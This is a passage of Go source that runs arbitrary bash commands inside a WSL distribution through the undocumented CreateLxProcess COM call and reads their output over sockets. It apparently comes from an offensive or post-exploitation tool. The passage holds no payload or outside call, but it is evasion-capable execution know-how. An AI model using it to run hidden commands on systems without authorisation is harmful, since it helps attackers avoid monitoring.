	if ei.Member10 != 0 {
		procCoTaskMemFree.Call(ei.Member10)
	}
	if ei.Member18 != 0 {
		procCoTaskMemFree.Call(ei.Member18)
	}
}

// ---------------------------------------------------------------------------
// Winsock helpers (used by execInWSL)
// ---------------------------------------------------------------------------

// readSocketOutput reads all available data from a socket handle in non-blocking mode with a timeout
func readSocketOutput(sock uintptr, timeout time.Duration) string {
	if sock == 0 {
		return ""
	}

	// Set non-blocking
	mode := uint32(1)
	procIoctlSocket.Call(sock, fionbio, uintptr(unsafe.Pointer(&mode)))

	var sb strings.Builder
	buf := make([]byte, bufferSize)
	deadline := time.Now().Add(timeout)

	for time.Now().Before(deadline) {
		r1, _, _ := procRecv.Call(
			sock,
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)-1),
			0,
		)
		n := int(int32(r1))
		if n > 0 {
			sb.Write(buf[:n])
			// Reset deadline on successful read — more data may follow
			deadline = time.Now().Add(500 * time.Millisecond)
		} else if n == 0 {
			// Connection closed
			break
		} else {
			// WSAEWOULDBLOCK or error — brief pause then retry
			time.Sleep(100 * time.Millisecond)
		}
	}

	return sb.String()
}

// ---------------------------------------------------------------------------
// Exec via CreateLxProcess (refactored to use newCOMSession)
// ---------------------------------------------------------------------------

// execInWSL creates a process inside a WSL distribution via COM and captures output
func execInWSL(distro, command string) (stdout, stderr string) {
	cs, cleanup, err := newCOMSession()
	if err != nil {
		stderr = err.Error()
		return
	}
	defer cleanup()

	// Initialize Winsock (needed for socket-based stdout/stderr from CreateLxProcess)
	var wsa wsaData
	r1, _, _ := procWSAStartup.Call(uintptr(0x0202), uintptr(unsafe.Pointer(&wsa)))
	if r1 != 0 {
		stderr = fmt.Sprintf("WSAStartup failed: %d", r1)
		return
	}
	defer procWSACleanup.Call()

	// Get distribution GUID
	distroGUID, err := resolveDistroGUID(cs.session, distro)
	if err != nil {
		stderr = err.Error()
		return
	}

	// Build command line: /bin/bash -c "<command>"
	bashPath, _ := syscall.BytePtrFromString("/bin/bash")
	dashC, _ := syscall.BytePtrFromString("-c")
	cmdStr, _ := syscall.BytePtrFromString(command)
	nullTerm := uintptr(0)

	// Command line array: ["/bin/bash", "-c", command, NULL]
	commandLine := [4]uintptr{
		uintptr(unsafe.Pointer(bashPath)),
		uintptr(unsafe.Pointer(dashC)),
		uintptr(unsafe.Pointer(cmdStr)),
		nullTerm,
	}

	// Initialize standard handles (all console type)
	stdHandles := lxssStdHandles{}

	// Output variables
	var (
		distributionId windows.GUID
		instanceId     windows.GUID
		processHandle  uintptr
		serverHandle   uintptr
		stdinSock      uintptr
		stdoutSock     uintptr
		stderrSock     uintptr
		commChannel    uintptr
		interopSocket  uintptr
		createError    lxssErrorInfo
	)

	// Call CreateLxProcess — argument list depends on version
	createIdx := createLxProcessIndex(cs.ifVer)
	var createArgs []uintptr

	baseArgs := []uintptr{
		uintptr(unsafe.Pointer(&distroGUID)),        // DistroGuid
		uintptr(unsafe.Pointer(bashPath)),            // Filename
		3,                                            // CommandLineCount
		uintptr(unsafe.Pointer(&commandLine[0])),     // CommandLine
		0,                                            // CurrentWorkingDirectory
		0,                                            // NtPath
		0,                                            // NtEnvironment
		0,                                            // NtEnvironmentLength
		0,                                            // Username
		80,                                           // Columns
		25,                                           // Rows
		0,                                            // ConsoleHandle
		uintptr(unsafe.Pointer(&stdHandles)),         // StdHandles
		0,                                            // Flags
		uintptr(unsafe.Pointer(&distributionId)),     // out: DistributionId
		uintptr(unsafe.Pointer(&instanceId)),         // out: InstanceId
		uintptr(unsafe.Pointer(&processHandle)),      // out: ProcessHandle
		uintptr(unsafe.Pointer(&serverHandle)),       // out: ServerHandle
		uintptr(unsafe.Pointer(&stdinSock)),          // out: StandardIn
		uintptr(unsafe.Pointer(&stdoutSock)),         // out: StandardOut
		uintptr(unsafe.Pointer(&stderrSock)),         // out: StandardErr
		uintptr(unsafe.Pointer(&commChannel)),        // out: CommunicationChannel
	}

	if hasInteropSocket(cs.ifVer) {
		createArgs = append(baseArgs,
			uintptr(unsafe.Pointer(&interopSocket)),  // out: InteropSocket
			uintptr(unsafe.Pointer(&createError)),    // out: Error
		)
	} else {
		createArgs = append(baseArgs,
			uintptr(unsafe.Pointer(&createError)),    // out: Error (no InteropSocket)
		)
	}

	_, err = comVtableCall(cs.session, createIdx, createArgs...)
	if err != nil {
		errMsg := fmt.Sprintf("CreateLxProcess failed: %s", err)
		if createError.Member10 != 0 {
			errStr := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(createError.Member10)))
			errMsg += fmt.Sprintf("\nError: %s", errStr)
		}
		if createError.Member18 != 0 {
			warnStr := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(createError.Member18)))
			errMsg += fmt.Sprintf("\nWarnings: %s", warnStr)
		}
		freeErrorInfo(&createError)
		stderr = errMsg
		return
	}
	freeErrorInfo(&createError)

	cli.Message(cli.SUCCESS, "WSL process created successfully")

	// Cleanup handles on exit
	defer func() {
		if processHandle != 0 {
			windows.CloseHandle(windows.Handle(processHandle))
		}
		if serverHandle != 0 {
			windows.CloseHandle(windows.Handle(serverHandle))
		}
		if stdinSock != 0 {
			procClosesocket.Call(stdinSock)
		}
		if stdoutSock != 0 {
			procClosesocket.Call(stdoutSock)
		}
		if stderrSock != 0 {
			procClosesocket.Call(stderrSock)
		}
		if commChannel != 0 {
			procClosesocket.Call(commChannel)
		}
		if interopSocket != 0 {
			procClosesocket.Call(interopSocket)
		}
	}()

	// Wait briefly for process to produce output, then drain sockets
	time.Sleep(2 * time.Second)

	var sb strings.Builder
	outData := readSocketOutput(stdoutSock, 3*time.Second)
	errData := readSocketOutput(stderrSock, 1*time.Second)

	if outData != "" {
		sb.WriteString(outData)
	}

	// Wait for process completion
	if processHandle != 0 {
		event, _ := windows.WaitForSingleObject(windows.Handle(processHandle), 10000)
		if event == windows.WAIT_OBJECT_0 {
			var exitCode uint32
			if windows.GetExitCodeProcess(windows.Handle(processHandle), &exitCode) == nil {
				sb.WriteString(fmt.Sprintf("\nProcess exited with code: %d", exitCode))
			}
		}
	}

	stdout = sb.String()
	if errData != "" {
		stderr = errData
	}
	return
}
